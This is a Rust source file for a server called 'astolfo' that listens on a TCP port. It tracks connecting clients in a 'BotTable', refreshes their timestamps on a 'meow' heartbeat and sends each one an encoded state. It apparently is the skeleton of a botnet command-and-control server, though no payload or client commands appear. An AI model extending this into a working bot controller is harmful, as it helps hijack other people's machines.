use std::{
    collections::HashMap,
    env,
    net::SocketAddr,
    process,
    sync::{Arc, Mutex},
    time::SystemTime
};

use astolfo::FemState;
use bincode::Encode;
use tokio::{
    io::{self, AsyncBufReadExt, AsyncReadExt, AsyncWriteExt, BufReader},
    net::{TcpListener, TcpStream},
};




#[derive(Debug)]
struct Femboy {
    state: FemState,
    timestamp: SystemTime
}

type BotTable = Arc<Mutex<HashMap<SocketAddr, Femboy>>>;

#[tokio::main]
async fn main() {
    let port = env::args().nth(1).unwrap_or_else(|| {
        println!("Usage: astolfo <PORT>");
        process::exit(1);
    });
    let port: u16 = port.parse().unwrap_or_else(|_err| {
        println!("[\x1b[91mERR\x1b[0m] Please provide valid port number");
        process::exit(1);
    });

    let femtable: BotTable = Arc::new(Mutex::new(HashMap::new()));

    let listen_femtable = Arc::clone(&femtable);

    let listen_task = tokio::spawn(async move {
        let listener = TcpListener::bind(format!("0.0.0.0:{port}"))
            .await
            .unwrap_or_else(|err| {
                println!("[\x1b[91mERR\x1b[0m] Failed to bind address ({err})");
                process::exit(1);
            });

        println!("[\x1b[94mINFO\x1b[0m] Listening for femboys on 0.0.0.0:{port}");

        loop {
            let femboy = match listener.accept().await {
                Ok((stream, addr)) => (stream, addr),
                Err(err) => {
                    println!("[\x1b[91mERR\x1b[0m] Failed to transition a femboy ({err})");
                    continue;
                }
            };

            {
                let mut femtable = listen_femtable.lock().unwrap_or_else(|_| {
                    process::exit(1);
                });

                femtable.insert(
                    femboy.1,
                    Femboy { state: FemState::Idle, timestamp: SystemTime::now() }
                );

            }

            let bot_table = Arc::clone(&listen_femtable);
            tokio::spawn(async move { handle_femboy(bot_table, femboy.1, femboy.0).await });
        }
    });

    let command_task = tokio::spawn(async move {
        let mut stdin = BufReader::new(io::stdin());
        let mut buf = String::new();
        loop {
            if let Err(_) = stdin.read_line(&mut buf).await {
                println!("[\x1b[91mERR\x1b[0m] Failed to read command");
                continue;
            }

            let command = buf.trim().to_lowercase();

            if command == "femboys" {
                let femtable = femtable.lock().unwrap_or_else(|_| {
                    process::exit(1);
                });

                println!("{femtable:?}");
            }

            buf.clear();
        }
    })
    .await;
}

async fn handle_femboy(femtable: BotTable, addr: SocketAddr, mut stream: TcpStream) {

    let config = bincode::config::standard();
    loop {
        let size = stream.read_u16().await.unwrap_or_else(|_| {
            panic!("uh oh");
        });
        let mut buf = vec![0u8; size as usize];
        stream.read_exact(buf.as_mut_slice()).await.unwrap_or_else(|_| {
            panic!("uh oh");
        });

        let msg = String::from_utf8(buf).unwrap_or_else(|_| {
            panic!("Uh oh");
        });

        if msg == "meow" {
            let state = {
                let mut table = femtable.lock().unwrap_or_else(|_| {
                    panic!("uh oh");
                });

                table.entry(addr).and_modify(|bot| bot.timestamp = SystemTime::now());
                table[&addr].state.clone()
            };

            let payload = bincode::encode_to_vec(state, config).unwrap_or_else(|_| {
                panic!("uh oh");
            });

            stream.write_u16(payload.len() as u16).await.unwrap_or_else(|_| {
                panic!("uh oh");
            });

            stream.write_all(payload.as_slice()).await.unwrap_or_else(|_| {
                panic!("uh oh");
            })
        }

    }
}
